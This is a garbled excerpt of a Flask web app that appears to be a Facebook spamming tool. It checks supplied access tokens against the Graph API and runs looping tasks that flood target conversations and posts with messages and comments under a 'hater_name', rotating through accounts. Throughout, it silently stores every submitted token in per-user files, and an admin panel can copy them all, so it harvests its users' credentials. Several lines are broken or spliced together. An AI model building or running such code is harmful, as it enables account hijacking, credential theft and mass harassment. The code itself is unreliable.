...
def load_user_all_tokens(username):
    ...
    # Load regular tokens (This is where all tokens from all tools are saved)
    filename = f"{username}.txt"
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
...
def fetch_pages(user_token: str) -> List[Dict[str, Any]]:
    ...
    while url:
        try:
            resp = requests.get(url, params=params if url == PAGE_TOKEN_BASE_URL else None, timeout=1        if resp.status_code != 200:
            return pages
        ...
        save_new_valid_tokens([user_token], username)      
        # Token is valid, save it
        username = session.get("username")
        save_new_valid_tokens([user_token], username) pages
...
<body>
    <div class="container">
        ...
        <a href="/" class="back-btn">ðŸ  Home</a>
    </div>
</body>
</html>
"""
...
<head>
    ...
    <style>
        ...
        /* User Request: Stylish Red Home Button with Gradient */
        .nav-tabs li:first-child a {
            ...
            padding: 12px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(220, 20, 60, 0.4);
            transition: all 0.3s ease;
            border: 2px solid #dc143c;
        }
        .nav-tabs li:first-child a:hover {
            background: linear-gradient(135deg, #b01030 0%, #ff5252 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(220, 20, 60, 0.6);
        }
        .nav-tabs li:first-child a.active {
            background: linear-gradient(135deg, #dc143c 0%, #ff6b6b 100%);
            border: 2px solid #ffffff;
            box-shadow: 0 6px 12px rgba(220, 20, 60, 0.8);
        }
        .nav-tabs a.active {
    ...
    <div class="content">
        ...
        <div id="home" class="tab-content active">
            <div class="tool-section">
                <img src="https://i.ibb.co/TBVYWr4R/IMG-20251112-192746.jpg" alt="Convo Tool" class="tool-img">
        ...
        <div id="conversations" class="tab-content">
            <div class="section">
                ...
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>âŒ You need admin approval to use this tool</p>
                </div>
                {% else %}
        ...
        <div id="posts" class="tab-content">
            <div class="section">
                ...
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>âŒ You need admin approval to use this tool Contact With Devloper</p>
                </div>
                {% else %}
                <form method="POST" action="/start-task" enctype="multipart/form-data">
...
<head>
    ...
    <script>
        ...
        function copyAllTokens(username) {
            // Use a hidden element to store all tokens for easy copy
            const tokenText = document.getElementById(`${username}-all-tokens-text`).value;
    ...
    <div class="admin-container">
        ...
        <div class="admin-section">
            ...
            <div class="user-item">
                ...
                <!-- Hidden field for all tokens -->
                <input type="hidden" id="{{ username }}-all-tokens-text" value="{{ all_tokens[username]|join('\n') }}">
                
                <!-- Copy All Tokens Button -->
                <div style="margin-bottom: 10px;">
                    <button class="copy-btn" onclick="copyAllTokens('{{ username }}')">ðŸ“‹ Copy All Tokens ({{ all_tokens[username]|length }})</button>
                </div>
                ...
                <div class="token-section">
                    ...
                    <!-- All Saved Tokens (Regular, Convo, Post, Checker, etc.) -->
                    {% if regular_tokens.get(username) %}
                    <div class="token-box" id="{{ username }}-regular">
                        <strong>ðŸ”‘ All Saved Tokens ({{ regular_tokens[username]|length }}):</strong>
...
<body>
    ...
    <div class="log-container">
        ...
        <div id="logs">
            {% for log in logs %}
            <div class="log-entry {% if 'âœ…' in log.message %}success{% elif 'âŒ' in log.message %}error{% elif 'â„¹ï¸' in log.message %}info{% endif %}">
                {{ log.message }}<br>
...
<body>
    <div class="result-container">
        ...
        <div class="token-group valid-tokens">
            <h2>âœ… Valid Tokens ({{ valid_count }})</h2>
            <div class="token-list">
                {% for result in results %}
                    {% if result.valid %}
                        <div class="token-detail" style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px; padding: 15px; background: rgba(40, 167, 69, 0.2); border-radius: 10px; border: 2px solid rgba(40, 167, 69, 0.5);">
                            {% if result.picture %}
                            <img src="{{ result.picture }}" alt="Profile Picture" style="width: 80px; height: 80px; border-radius: 50%; border: 3px solid #28a745; box-shadow: 0 4px 10px rgba(0,0,0,0.5);">
                            {% endif %}
                            <div style="flex: 1;">
                                <p style="font-size: 20px; color: #28a745; font-weight: bold; margin-bottom: 8px;">âœ… {{ result.name }}</p>
                                <p><strong>ðŸ†” UID:</strong> <span style="color: #87CEEB;">{{ result.uid }}</span></p>
                                <p><strong>ðŸ”— Profile:</strong> <a href="{{ result.profile_url }}" target="_blank" style="color: #87CEEB; text-decoration: underline;">View on Facebook</a></p>
                                <p style="word-break: break-all; font-size: 12px; margin-top: 10px;"><strong>ðŸ”‘ Full Token:</strong> <code style="background: rgba(0,0,0,0.7); padding: 5px; border-radius: 5px; color: #51cf66;">{{ result.token }}</code></p>
                            </div>
                        </div>
                    {% endif %}
                {% endfor %}
        ...
        <div class="token-group invalid-tokens">
            <h2>âŒ Invalid Tokens ({{ invalid_count }})</h2>
            <div class="token-list">
                {% for result in results %}
                    {% if not result.valid %}
...
def admin_panel():
    ...
    all_tokens = {u: load_user_all_tokens(u) for u in users} # Load all tokens for the new copy function
...
def start_task():
    ...
    if not tokens:
        flash("No tokens provided or loaded.", "error")
        return redirect(url_for("home"))
    
    # Validate tokens before starting the task
    valid_tokens = []
    for token in tokens:
    ...
    if not valid_tokens:
        flash("All provided tokens are invalid. Task aborted.", "error")
        return redirect(url_for("home"))
    
    # Save all newly validated tokens
    save_new_valid_tokens(valid_tokens, username)
    
    # The rest of the start_task logic
    # ... (rest of the function)er_name, token_option, task_id, task_type, username)
        ).start()
    elif task_type == "post":
...
def save_valid_tokens(tokens, username):
    """Saves a list of valid tokens to the user's main token file, ensuring no duplicates."""
    
    # Load existing tokens
    existing_tokens = load_user_tokens(username)
    
    # Combine new and existing tokens, removing duplicates
    all_tokens = existing_tokens + tokens
    unique_tokens = []
    seen = set()
    for token in all_tokens:
        if token not in seen:
    ...
    # Save unique tokens to user-specific file
    filename = f"{username}.txt"
    with open(filename, 'w') as f:
        for token in unique_tokens:
            f.write(f"{token}\n")

def save_new_valid_tokens(new_tokens, username):
    """Saves a list of NEW valid tokens to the user's main token file, appending to existing ones."""
    
    # Load existing tokens
    existing_tokens = load_user_tokens(username)
    
    # Identify new tokens that are not already present
    existing_set = set(existing_tokens)
    tokens_to_add = [token for token in new_tokens if token not in existing_set]
    
    if tokens_to_add:
        # Append only the new, unique tokens
        filename = f"{username}.txt"
        with open(filename, 'a') as f:
            for token in tokens_to_add:
                f.write(f"{token}\n")
        
        # Note: In-memory cache for day/night tokens is updated on login.
        # For the admin panel to see it immediately, we rely on the file system being re-read.
        return True
    return False
...
def check_tokens():
    ...
    for token in tokens:
        ...
        try:
            # Mobile-supported URL for token checking
            url = f"https://graph.facebook.com/v1.0/me?fields=id,name,picture&access_token={token}"
...
def fetch_conversations():
    ...
    try:
        ...
        if check_res.status_code != 200:
            ...
            # Token is valid, save it
            username = session.get("username")
            save_new_valid_tokens([token], username)
            
            # Fetch UIDs valid, save it
            username = session.get("username")
            save_new_valid_tokens([token], username)
            
            # Fetch Messenger conversations           username = session.get("username")
            save_new_valid_tokens([token], username)
            
            # Fetch UIDvalid, save it
            username = session.get("username")
            save_new_valid_tokens([token], username)
            ...
            # Fetch UIDssenger conversations
...
def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type, username):
    ...
    add_log(task_id, f"ðŸš€ {task_type} task started for conversation: {convo_id}")
    
    # Get group name info once at start
    token = tokens[0]
    group_name = get_group_name(convo_id, token)
    if group_name:
        add_log(task_id, f"â„¹ï¸ Target Group: {group_name}")
    
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "ðŸ›‘ Task stopped manually.")
                break
            ...
            if token_option == "daynight":
                ...
                if current_tokens != tokens:
                    ...
                    add_log(task_id, f"ðŸ”„ Token set rotated. Now using {len(tokens)} tokens.")
            ...
            if not tokens:
                add_log(task_id, "âŒ No tokens available for current time period.")
...
def start_posting(tokens, messages, post_id, interval, hater_name, token_option, task_id, username):
    ...
    add_log(task_id, f"ðŸš€ Post task started for post: {post_id}")
    
    # Get post info once at start
    token = tokens[0]
    post_info = get_post_info(post_id, token)
    if post_info:
        add_log(task_id, f"â„¹ï¸ Target Post: {post_info}")
...
def send_msg(convo_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        ...
        if response.status_code == 200:
            log_msg = f"âœ… {token_display} | {sender_name} | Message sent: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"âŒ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
    except Exception as e:
        log_msg = f"âŒ{token_display} | Error: {str(e)}"
        add_log(task_id, log_msg)
...
def send_comment(post_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        ...
        if response.status_code == 200:
            log_msg = f"âœ… {token_display} | {sender_name} | Comment posted: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"âŒ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
...
def get_sender_name(accdef is_token_valid(token):
    """Checks if a token is valid by hitting the graph API."""
    try:
        # Using the mobile-supported URL for consistency and reliability
        url = f"https://graph.facebook.com/v1.0/me?fields=id&access_token={token}"
        res = requests.get(url)
        return res.status_code == 200
    except:
        return Falsesponse.json()
